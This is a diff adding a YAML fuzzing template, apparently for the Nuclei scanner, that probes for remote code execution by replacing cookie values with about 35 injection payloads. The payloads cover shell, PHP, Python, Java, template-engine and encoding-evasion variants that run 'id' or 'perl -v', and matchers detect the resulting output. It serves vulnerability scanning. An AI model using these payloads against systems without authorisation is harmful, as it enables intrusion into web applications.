@@ -1,0 +1,80 @@
+http:
+- extractors:
+  - regex:
+    - (u|g)id=.*
+    type: regex
+  fuzzing:
+  - fuzz:
+    - '{{rce}}'
+    mode: single
+    part: cookie
+    type: replace
+  matchers:
+  - condition: or
+    type: word
+    words:
+    - '''id'' is not recognized as an internal or external command'
+    - syntax error near unexpected token `
+  - condition: and
+    part: body
+    type: word
+    words:
+    - uid=
+    - gid=
+  - condition: and
+    part: body
+    type: word
+    words:
+    - PHP Extension
+    - PHP Version
+  - type: word
+    words:
+    - This is perl
+  matchers-condition: or
+  payloads:
+    rce:
+    - $(id)
+    - '%2560id%2560'
+    - '%26id%26'
+    - '%60id%60'
+    - '''.system(''id'').'''
+    - '''.system(''perl -v'').'''
+    - '''i''d'
+    - '''id'''
+    - '**id**'
+    - '*id'
+    - '*id*'
+    - /*$(id)`id`
+    - '`id`'
+    - '`id`#'
+    - '`id`&'
+    - i`u`d
+    - id
+    - id;
+    - id|
+    - '&id&'
+    - import os;os.system('id');
+    - '{% import os %}{{os.system(''id'')'
+    - '"i"d'
+    - <%25+system("id")+%25>
+    - <%= system("id") %>
+    - <?php escapeshellcmd("id"); ?>
+    - <?php exec("id"); ?>
+    - <?php shell_exec("id"); ?>
+    - <?php system("id"); ?>
+    - T(java.lang.Runtime).getRuntime().exec("id")
+    - '`/usr/bin/id`'
+    - echo `id`;
+    - echo exec(id);
+    - s:19:"<?php phpinfo(); ?>";
+  pre-condition:
+  - dsl:
+    - method == "GET"
+    type: dsl
+  stop-at-first-match: true
+id: rce-cookie-replace
+info:
+  author: reewardius
+  name: Remote Code Execution
+  severity: critical
+  tags: fuzzing-req,fuzzing-req-rce,fuzzing-req-cookie,dast
